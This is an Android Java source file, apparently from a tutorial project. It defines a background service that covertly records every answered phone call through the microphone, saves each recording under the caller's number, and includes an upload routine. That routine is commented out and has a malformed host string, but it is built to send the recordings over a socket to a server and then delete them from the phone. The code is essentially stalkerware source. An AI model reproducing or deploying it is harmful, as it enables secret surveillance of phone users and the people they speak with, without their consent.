package com.example.yucong.phonelistenerservices.phonelistener;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.example.yucong.phonelistenerservices.utils.StreamTool;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

public class PhoneService extends Service {
    public PhoneService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);//监听电话状态
    }

    private final class PhoneListener extends PhoneStateListener{
        private String incomingNumber;//来电号码
        private File file;
        private MediaRecorder mediaRecorder;

        @Override
        public void onCallStateChanged(int state, String phoneNumber) {
            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING://来电
                        this.incomingNumber = phoneNumber;
                        break;

                    case TelephonyManager.CALL_STATE_OFFHOOK://接电话中
                        file = new File(Environment.getExternalStorageDirectory(), incomingNumber+System.currentTimeMillis()+ ".3gp");
                        mediaRecorder = new MediaRecorder();
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//数据源录音方向麦克风
                        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//输出格式 gpp
                        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编解码AMR
                        mediaRecorder.setOutputFile(file.getAbsolutePath());
                        mediaRecorder.prepare();//前期准备资源
                        mediaRecorder.start();//开始刻录
                        break;

                    case TelephonyManager.CALL_STATE_IDLE://挂电话
                        if(mediaRecorder != null){
                            mediaRecorder.stop();//停止刻录
                            mediaRecorder.release();//释放资源
                            mediaRecorder = null;//将类置为空
//                            uploadFile();
                        }
                        break;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }



        //上传文件到服务器

        private void uploadFile() {
            new Thread(new Runnable() {
                public void run() {
                    try {
                        if(file!=null && file.exists()){
                            Socket socket = new Socket("10.0.2.2:8080", 8080);
                            OutputStream outStream = socket.getOutputStream();
                            String head = "Content-Length="+ file.length() + ";filename="+ file.getName() + ";sourceid=\r\n";
                            outStream.write(head.getBytes());

                            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());
                            String response = StreamTool.readLine(inStream);
                            String[] items = response.split(";");
                            String position = items[1].substring(items[1].indexOf("=")+1);

                            RandomAccessFile fileOutStream = new RandomAccessFile(file, "r");
                            fileOutStream.seek(Integer.valueOf(position));
                            byte[] buffer = new byte[1024];
                            int len = -1;
                            while( (len = fileOutStream.read(buffer)) != -1){
                                outStream.write(buffer, 0, len);
                            }
                            fileOutStream.close();
                            outStream.close();
                            inStream.close();
                            socket.close();
                            file.delete();
                            file = null;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }





}

